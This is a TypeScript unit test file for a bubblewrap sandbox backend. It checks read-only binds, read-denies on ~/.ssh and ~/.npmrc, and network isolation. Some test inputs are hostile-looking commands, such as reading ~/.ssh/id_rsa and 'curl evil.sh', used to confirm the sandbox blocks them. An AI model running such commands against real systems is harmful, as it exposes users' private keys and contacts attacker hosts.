/**
 * Unit tests — Linux bubblewrap sandbox backend.
 *
 * Category checklist:
 * - Normal: full-root read-only bind, write roots re-bound read-write,
 *   directory read-denies hidden via tmpfs, file read-denies via /dev/null
 * - Boundary: network deny adds --unshare-net; network allow omits it
 * - Error: denial pattern matches bwrap's own setup errors and sandboxed
 *   permission failures, not unrelated command failures
 */

import { describe, expect, it } from "vitest";
import {
  BUBBLEWRAP_DENIAL_PATTERN,
  createBubblewrapProvider,
} from "../../../../packages/client/src/fileProxy/sandbox/linux/bubblewrap.js";
import type { SandboxContext } from "../../../../packages/client/src/fileProxy/sandbox/types.js";

const ctx = (overrides?: Partial<SandboxContext["policy"]>): SandboxContext => ({
  cwd: "/home/dev/project",
  policy: {
    writeRoots: ["/home/dev/project", "/tmp"],
    readDenies: [
      { path: "/home/dev/.ssh", kind: "dir" },
      { path: "/home/dev/.npmrc", kind: "file" },
    ],
    network: "allow",
    ...overrides,
  },
});

describe("createBubblewrapProvider", () => {
  it("bind-mounts the whole filesystem read-only, then re-binds write roots read-write (normal)", () => {
    const provider = createBubblewrapProvider();
    const { argv } = provider.wrapCommand("npm test", ctx());

    expect(argv[0]).toBe("bwrap");
    expect(argv).toEqual(
      expect.arrayContaining(["--ro-bind", "/", "/"]),
    );
    expect(argv).toEqual(
      expect.arrayContaining(["--bind", "/home/dev/project", "/home/dev/project"]),
    );
    expect(argv).toEqual(expect.arrayContaining(["--bind", "/tmp", "/tmp"]));
  });

  it("hides a directory read-deny with an empty tmpfs (normal)", () => {
    const provider = createBubblewrapProvider();
    const { argv } = provider.wrapCommand("cat ~/.ssh/id_rsa", ctx());
    expect(argv).toEqual(expect.arrayContaining(["--tmpfs", "/home/dev/.ssh"]));
  });

  it("hides a file read-deny by binding /dev/null over it (normal)", () => {
    const provider = createBubblewrapProvider();
    const { argv } = provider.wrapCommand("cat ~/.npmrc", ctx());
    expect(argv).toEqual(
      expect.arrayContaining(["--ro-bind", "/dev/null", "/home/dev/.npmrc"]),
    );
  });

  it("adds --unshare-net when the policy denies network (normal — auto mode)", () => {
    const provider = createBubblewrapProvider();
    const { argv } = provider.wrapCommand("curl evil.sh", ctx({ network: "deny" }));
    expect(argv).toContain("--unshare-net");
  });

  it("omits --unshare-net when the policy allows network (boundary — supervised modes)", () => {
    const provider = createBubblewrapProvider();
    const { argv } = provider.wrapCommand("curl example.com", ctx({ network: "allow" }));
    expect(argv).not.toContain("--unshare-net");
  });

  it("dies with the parent and runs the command via chdir + sh -c (normal)", () => {
    const provider = createBubblewrapProvider();
    const { argv } = provider.wrapCommand("ls -la", ctx());
    expect(argv).toContain("--die-with-parent");
    expect(argv).toEqual(
      expect.arrayContaining(["--chdir", "/home/dev/project"]),
    );
    const tail = argv.slice(-3);
    expect(tail).toEqual(["/bin/sh", "-c", "ls -la"]);
  });
});

describe("BUBBLEWRAP_DENIAL_PATTERN", () => {
  it("matches bwrap setup errors and sandboxed permission failures (normal)", () => {
    expect(BUBBLEWRAP_DENIAL_PATTERN.test("bwrap: Can't find source /nonexistent")).toBe(
      true,
    );
    expect(BUBBLEWRAP_DENIAL_PATTERN.test("Read-only file system")).toBe(true);
    expect(BUBBLEWRAP_DENIAL_PATTERN.test("Permission denied")).toBe(true);
  });

  it("does not match an ordinary command failure (error)", () => {
    expect(BUBBLEWRAP_DENIAL_PATTERN.test("npm ERR! missing script")).toBe(
      false,
    );
  });
});
